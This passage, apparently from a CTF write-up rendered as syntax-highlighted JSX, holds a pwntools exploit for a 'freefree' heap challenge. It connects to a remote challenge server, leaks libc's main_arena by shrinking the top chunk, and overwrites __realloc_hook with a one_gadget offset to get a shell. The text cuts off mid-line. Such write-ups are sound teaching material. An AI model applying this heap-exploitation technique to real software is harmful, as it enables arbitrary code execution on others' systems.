punctuation\",children:\"(\"}),\"getchar\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"index\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\t\",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Receive data outside\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"GDB\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\tcommand\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`'''\n`})]}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`\tb*main+98\n`})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`\tb*main+215\n`})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`\tb*main+226\n`})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`\tb*main+316\n`})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`\tc\n`})}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:\"\t'''\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\t\",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# b*sysmalloc\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\t\",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"with\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"open\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'/tmp/command.gdb'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'wt'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"as\"}),\" f\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\t        f\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"write\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"command\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\tsubprocess\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"Popen\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'/usr/bin/x-terminal-emulator'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'-e'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'gdb'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'-p'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"str\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"pid\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'-x'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'/tmp/command.gdb'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\t\",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"input\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"         \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# input() to make program wait with gdb\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# p = process('./freefree_patched')\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" connect\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'34.136.108.210'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"40007\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"n \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"10\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"########################################\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"### Stage 1: Leak main arena address ###\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"########################################\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"log\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"info\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'Stage 1: Leak main arena address...'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Malloc to control all next chunks\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"malloc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\"n\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Change top chunk size\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),\"    \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# chunk data\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x8\"}),\"    \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Prevsize\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0xd51\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"gets\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\"n\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Trigger to free top chunl\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"malloc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\"n\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x1000\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Malloc to get libc main arena address\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"malloc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\"n\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x100\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"puts\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\"n\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"libc_main_arena \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" u64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"recvline\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\\\\x00\\\\x00'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"log\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"success\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'Libc main_arena: '\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"hex\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"libc_main_arena\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"libc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"address \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" libc_main_arena \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),\" libc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"sym\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'main_arena'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"log\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"success\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'Libc main_arena: '\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"hex\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"libc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"address\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"####################################\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"### Stage 2: Free 2 small chunks ###\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"####################################\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"log\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"info\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'Stage 2: Free 2 small chunks...'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# First freed chunk\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Change top chunk size to 0x20300\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"malloc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\"n\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0xcf0\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Overwrite top chunk size to 0x300\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0xcf0\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"8\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x301\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"gets\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\"n\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Trigger to free top chunk\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"malloc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\"n\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x1000\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Second freed chunk\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Change top chunk size to 0x20300\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"malloc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\"n\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0xcf0\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Overwrite top chunk size to 0x300\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0xcf0\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"8\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x301\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"gets\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\"n\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Trigger to free top chunk\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"malloc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"3\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\"n\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x1000\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"##########################\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"### Stage 3: Get shell ###\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"##########################\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"log\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"info\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'Stage 3: Get shell...'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0xcf0\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"8\"}),\"    \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Prevsize\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x2e1\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"libc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"sym\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'__realloc_hook'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"gets\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\"n\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"malloc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"3\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\"n\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x2e0\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"malloc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"3\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\"n\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x2e0\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"libc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"address \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0xe6aee\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"libc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"sym\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'realloc'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"24\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"gets\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"3\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\"n\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" 